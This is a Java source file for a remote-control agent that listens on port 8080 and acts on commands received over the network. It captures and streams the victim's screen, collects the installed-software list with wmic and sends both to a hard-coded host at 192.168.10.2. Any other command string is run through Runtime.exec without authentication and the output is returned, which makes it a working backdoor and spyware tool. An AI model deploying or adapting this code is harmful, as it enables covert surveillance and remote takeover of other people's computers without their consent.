        import java.net.*;
        import java.io.*;

        import java.awt.*;
        import java.awt.image.BufferedImage;

        import javax.swing.ImageIcon;

        public class Client
        {
                public static final int port = 8080;

                public static void main(String a[])
                {
                while(true)
                {

 		try
                {
                        System.out.println("creating server");
                        ServerSocket ss = new ServerSocket(port);
                        System.out.println("waiting for client");
						Process child1 = Runtime.getRuntime().exec("wmic /output:D:\\InstalledSoftwareList.xls product get name,version");
                        Socket socket = ss.accept();
                        System.out.println("got client");
                        //new Socket(ipAddress, serverPort); // create a socket with the server's IP address and server's port.


                        InputStream sin = socket.getInputStream();
    			OutputStream sout = socket.getOutputStream();

                        DataInputStream in = new DataInputStream(sin);
                        DataOutputStream out = new DataOutputStream(sout);
 String cmd = in.readUTF();
 						System.out.println("cmd"+cmd);
                        Socket client = new Socket("192.168.10.2",8081);  //Ip address

                        InputStream sin1 = client.getInputStream();
                        OutputStream sout1 = client.getOutputStream();

                        DataInputStream in2 = new DataInputStream(sin1);
                        DataOutputStream out2 = new DataOutputStream(sout1);

                       
                        ss.close();
                        socket.close();
                        if(cmd.equals("image"))
                        {

                                //InputStream oin = client.getInputStream();
                                OutputStream oout = client.getOutputStream();
                                ObjectOutputStream os = new ObjectOutputStream(oout);

                                System.out.println("getting Image");

                                try
                                {

                                int WIDTH = Toolkit.getDefaultToolkit().getScreenSize().width;
                                int HEIGHT= Toolkit.getDefaultToolkit().getScreenSize().height;
                                Robot robot;
                                Rectangle  screenRect = new Rectangle(0,0,WIDTH,HEIGHT);
                                robot =new Robot();

                                BufferedImage i= robot.createScreenCapture(screenRect);
                                Image image = i.getScaledInstance(WIDTH,HEIGHT,Image.SCALE_SMOOTH);
                                ImageIcon ii = new ImageIcon(image);

                                System.out.println("sending Image");

                                os.writeObject(ii);
                                os.flush();
                                os.close();
                                oout.close();

                                System.out.println("Image sent");

                                }
                                catch(Exception e){System.out.println("image excp "+e);}
                        }
                        else
                            if(cmd.equalsIgnoreCase("application"))
                            {
                            	
                            	//Thread.sleep(100000);
								System.out.println("Sending Software List..");
								System.out.println(" List Send !");
								Socket client1 = new Socket("192.168.10.2",8098);// Ip Address
                            	 File myFile = new File("D:\\InstalledSoftwareList.xls");
                            	    //while (true) {
										
                            	      byte[] mybytearray = new byte[(int) myFile.length()];
                            	      BufferedInputStream bis = new BufferedInputStream(new FileInputStream(myFile));
                            	      bis.read(mybytearray, 0, mybytearray.length);
                            	      OutputStream os = client1.getOutputStream();
                            	      os.write(mybytearray, 0, mybytearray.length);
                            	      os.flush();
									    bis.close();
									  client1.close();
									
                            	    //}
									
                                
                            }
                        else
                        if(cmd.equals("video"))
                        {

                                OutputStream oout = client.getOutputStream();
                                ObjectOutputStream os = null;//new ObjectOutputStream(oout);

                                System.out.println("getting Image");

                                try
                                {

                                int WIDTH = Toolkit.getDefaultToolkit().getScreenSize().width;
                                int HEIGHT= Toolkit.getDefaultToolkit().getScreenSize().height;
                                Robot robot;
                                Rectangle  screenRect = new Rectangle(0,0,WIDTH,HEIGHT);
                                robot =new Robot();

                                while(true)
                                {

                                BufferedImage i= robot.createScreenCapture(screenRect);
                                Image image = i.getScaledInstance(WIDTH,HEIGHT,Image.SCALE_SMOOTH);
                                ImageIcon ii = new ImageIcon(image);

                                if(ii==null)
                                        break;

                                System.out.println("sending Image");

                                os = new ObjectOutputStream(oout);
                                os.writeObject(ii);
                                os.flush();
                                os.close();

                                try{
                                Thread.sleep(1000);
                                }catch(Exception e){}
                                }
                                //os.close();
                                oout.close();

                                System.out.println("Image sent");

                                }
                                catch(Exception e){System.out.println("image excp "+e);}

                        }

                        else{
                                try
                                {
                                        System.out.println (cmd);

                                        Process child = Runtime.getRuntime().exec(cmd);
                                        InputStream lsOut = child.getInputStream();
                                        InputStreamReader r = new InputStreamReader(lsOut);
                                        BufferedReader in1 = new BufferedReader(r);

                                        String opt = in1.readLine();

                                        while ((opt = in1.readLine()) != null)
                                        {
                                                System.out.println(opt);
                                                out2.writeUTF(opt);
                                        }

                                        out2.writeUTF("bye");

                                }
                                catch(Exception e)
                                {
                                        System.out.println(e);
                                }
                        }
                        out2.flush();
                        client.close();
                }
                catch(Exception ee)
                {
                        System.out.println (ee);
                }
                }
				// if(this.dispose())
				// {
				// }
                }
        }
